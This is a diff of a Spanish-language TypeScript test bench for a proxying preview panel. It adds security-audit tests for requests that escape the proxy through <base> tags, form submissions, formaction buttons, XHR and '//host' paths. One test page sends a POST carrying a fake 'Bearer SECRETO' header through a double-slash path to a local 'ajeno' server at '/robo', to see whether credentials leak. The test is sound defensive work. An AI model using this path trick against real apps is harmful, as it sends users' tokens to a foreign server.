@@ -43,6 +43,30 @@ const PAGINA_ABS = (): string =>
   <button id="ext" style="position:absolute;left:10px;top:190px;width:200px;height:40px" onclick="location.href='http://otra-web.example/x'">fuera</button>
   <script>fetch('${appOrigin}/dato').then(function (r) { return r.text(); }).then(function (t) { log('fetch-abs:' + t); }, function (e) { log('fetch-abs:ERROR ' + e.message); });</script>`,
   );
+const alAjeno: string[] = [];
+const ajeno = await servidorFalso((req, res) => {
+  alAjeno.push(`${req.method} ${req.url} auth=${req.headers.authorization ?? '-'}`);
+  res.writeHead(200, { 'access-control-allow-origin': '*', 'access-control-allow-headers': '*', 'access-control-allow-methods': '*' }).end('ajeno');
+});
+const alApp: string[] = [];
+// La página del auditor, en pequeño: con <base> al dominio real (A-4), una ruta «//host» (A-1), form.submit() (A-3),
+// formaction (G9), XHR (G11) y una consulta con ancla que no debe perderse (G15).
+const PAGINA_AGENTE = (): string =>
+  pagina(
+    'agente',
+    `<base href="${appOrigin}/">
+  <a id="rel" href="ok?desde=base#ancla" style="position:absolute;left:10px;top:10px;display:block;width:200px;height:40px;background:#ddd">relativo con base</a>
+  <form id="fp" method="post" action="${appOrigin}/recibe?via=submit"><input type="hidden" name="campo" value="valor"></form>
+  <button id="sub" style="position:absolute;left:10px;top:130px;width:200px;height:40px" onclick="document.getElementById('fp').submit()">form.submit()</button>
+  <form id="fa" method="post"><input type="hidden" name="campo" value="fa"><button id="fab" formaction="${appOrigin}/recibe?via=formaction" style="position:absolute;left:10px;top:190px;width:200px;height:40px">formaction</button></form>
+  <script>
+    fetch('${appOrigin}//localhost:${ajeno.port}/robo', { method: 'POST', body: 'cuerpo', headers: { authorization: 'Bearer SECRETO' } }).then(function (r) { return r.text(); }).then(function (t) { log('fetch-doble:' + t.slice(0, 20)); }, function () { log('fetch-doble:ERROR'); });
+    document.addEventListener('click', function (e) { log('clic:' + (e.target.id || e.target.tagName)); }, true);
+    document.addEventListener('submit', function (e) { log('submit:' + e.target.id + ':' + (e.submitter ? e.submitter.getAttribute('formaction') : '-')); });
+    fetch('dato').then(function (r) { return r.text(); }).then(function (t) { log('fetch-base:' + t); }, function () { log('fetch-base:ERROR'); });
+    var x = new XMLHttpRequest(); x.open('GET', '${appOrigin}/dato'); x.onload = function () { log('xhr-abs:' + x.responseText); }; x.onerror = function () { log('xhr-abs:ERROR'); }; x.send();
+  </script>`,
+  );
 const app = await servidorFalso((req, res) => {
   const u = new URL(req.url ?? '/', 'http://x');
   if (u.pathname === '/log') {
@@ -53,6 +77,15 @@ const app = await servidorFalso((req, res) => {
   if (u.pathname === '/err') html(PAGINA_ERR);
   else if (u.pathname === '/ok') html(PAGINA_OK);
   else if (u.pathname === '/abs') html(PAGINA_ABS());
+  else if (u.pathname === '/agente') html(PAGINA_AGENTE());
+  else if (u.pathname === '/recibe') {
+    alApp.push(`${req.method} ${u.pathname}${u.search}`);
+    // Como una app real: tras un POST, 303 a una página normal (la respuesta a un POST no lleva agente).
+    res.writeHead(303, { location: '/ok?desde=post' }).end();
+  } else if ((req.url ?? '').startsWith('//')) {
+    alApp.push(`${req.method} ${req.url}`);
+    res.writeHead(404, { 'content-type': 'text/plain' }).end('ruta-doble-en-la-app');
+  }
   else if (u.pathname === '/dato') res.writeHead(200, { 'content-type': 'text/plain' }).end('dato-de-la-app');
   else res.writeHead(404, { 'content-type': 'text/plain' }).end('no existe');
 });
@@ -82,6 +115,7 @@ const escenas: Record<string, () => PanelState> = {
   matriz: () => estado(px, [celda('r0a', 'iphone-15', '/ok', 0), celda('r0b', 'laptop', '/ok', 0), celda('r1a', 'iphone-15', '/err', 1), celda('r1b', 'laptop', '/err', 1)]),
   pub: () => estado(px, tres('/ok'), { deployed: true }),
   abs: () => estado(px, tres('/abs')),
+  agente: () => estado(px, [celda('a', 'iphone-15', '/agente')]),
 };
 const haciaHost: { e: string; m: Record<string, unknown> }[] = [];
 const panel = await servidorFalso((req, res, body) => {
@@ -218,7 +252,7 @@ try {
       await clic(s, 0, 60, y);
       const llegan = await cargadas('/ok', d, 3, 6000);
       const en = await evalua<string[]>(s, `[...document.querySelectorAll('.ruta')].map(function (x) { return x.textContent; })`);
-      caso(id, titulo, !llegan, `cargas de /ok tras el clic en el móvil: ${j(veces('cargada:/ok', d))}; rutas en los rótulos: ${j(en)}`);
+      caso(id, titulo, !llegan || !en.every((r) => r.includes('?desde=')), `cargas de /ok tras el clic en el móvil: ${j(veces('cargada:/ok', d))}; rutas en los rótulos: ${j(en)}`);
       await volver();
     };
     await espera(400);
@@ -240,6 +274,46 @@ try {
     caso('M3-5', 'un salto por código a otra web deja la celda en blanco, o no se explica', avisos.length < 1 || !avisos[0].includes('otra-web.example') || alhost[0]?.origin !== 'http://otra-web.example' || Object.keys(recargas).length > 0 || !viva, `avisos en los rótulos: ${j(avisos)}; al host: ${j(alhost)}; recargas: ${j(recargas)}; ¿la celda sigue viva (el enlace siguiente funciona)? ${viva}`);
   }
 
+  // ══════════ Auditoría A · el agente con <base>, rutas «//host», form.submit(), formaction y XHR
+  {
+    let d = registro.length;
+    const s = await pestana(`${panel.origin}/?e=agente`);
+    await cargadas('/agente', d, 1);
+    await hasta(() => registro.slice(d).filter((r) => /^(fetch-doble|fetch-base|xhr-abs):/.test(r.ev)).length >= 3, 6000);
+    const ev = (p: string): string => registro.slice(d).find((r) => r.ev.startsWith(p))?.ev ?? '(nada)';
+    caso('AUD-A1', '[A-1] un fetch a la propia app con una ruta «//host/…» sale a otro servidor con sus cabeceras', alAjeno.length > 0 || !alApp.some((x) => x.includes('//localhost')), `al servidor ajeno: ${j(alAjeno)}; a la app: ${j(alApp)}; la página vio: ${ev('fetch-doble:')}`);
+    caso('AUD-A4a', '[A-4] con <base> al dominio real, un fetch relativo no pasa por la celda', ev('fetch-base:') !== 'fetch-base:dato-de-la-app', ev('fetch-base:'));
+    caso('AUD-G11', '[G11] un XHR al dominio completo de la app no pasa por la celda', ev('xhr-abs:') !== 'xhr-abs:dato-de-la-app', ev('xhr-abs:'));
+    const volver = async (): Promise<void> => {
+      const d0 = registro.length;
+      await evalua(s, `window.postMessage({ t: 'drive', group: 0, path: '/agente' }, location.origin)`);
+      await cargadas('/agente', d0, 1, 6000);
+      await espera(500);
+    };
+    // Enlace relativo con <base>: se queda en la celda, con su consulta y su ancla.
+    d = registro.length;
+    await clic(s, 0, 60, 30);
+    const base = await cargadas('/ok', d, 1, 6000);
+    const ruta = await evalua<string>(s, `document.querySelector('.ruta').textContent`);
+    caso('AUD-A4b', '[A-4, G15] con <base> al dominio real, un enlace relativo saca a la celda, o pierde la consulta o el ancla', !base || ruta !== '/ok?desde=base#ancla', `¿llegó a /ok? ${base}; ruta en el rótulo: ${ruta}`);
+    // La orden «nav» del panel con <base> en la página: vuelve sin salir de la celda.
+    d = registro.length;
+    await evalua(s, `window.postMessage({ t: 'drive', group: 0, path: '/agente' }, location.origin)`);
+    const vuelve = await cargadas('/agente', d, 1, 6000);
+    caso('AUD-A4c', '[A-4] con <base> al dominio real, la orden de navegar del panel saca a la celda', !vuelve, `¿volvió a /agente? ${vuelve}`);
+    await espera(500);
+    // form.submit() con POST al dominio completo (A-3): POST, y en la celda.
+    const n0 = alApp.length;
+    await clic(s, 0, 60, 150);
+    await hasta(() => alApp.length > n0, 5000);
+    caso('AUD-A3', '[A-3, G5] form.submit() con POST al dominio completo se va del proxy, o deja de ser POST', !alApp.slice(n0).includes('POST /recibe?via=submit'), `lo que recibió la app: ${j(alApp.slice(n0))}`);
+    await volver();
+    const n1 = alApp.length;
+    await clic(s, 0, 60, 210);
+    await hasta(() => alApp.length > n1, 5000);
+    caso('AUD-G9', '[G9] un botón con formaction al dominio completo se va del proxy', !alApp.slice(n1).includes('POST /recibe?via=formaction'), `lo que recibió la app: ${j(alApp.slice(n1))}`);
+  }
+
   // ══════════ M1 · una web publicada se anuncia en la barra
   {
     const d = registro.length;
@@ -252,7 +326,7 @@ try {
   console.log(`\nERROR del montaje: ${(e as Error).message}`);
   caso('MONTAJE', 'el banco no pudo montar el panel', true, (e as Error).message);
 } finally {
-  for (const x of [px, app, panel]) await x.close();
+  for (const x of [px, app, panel, ajeno]) await x.close();
   await nav.cierra();
 }
 process.exit(resultado());
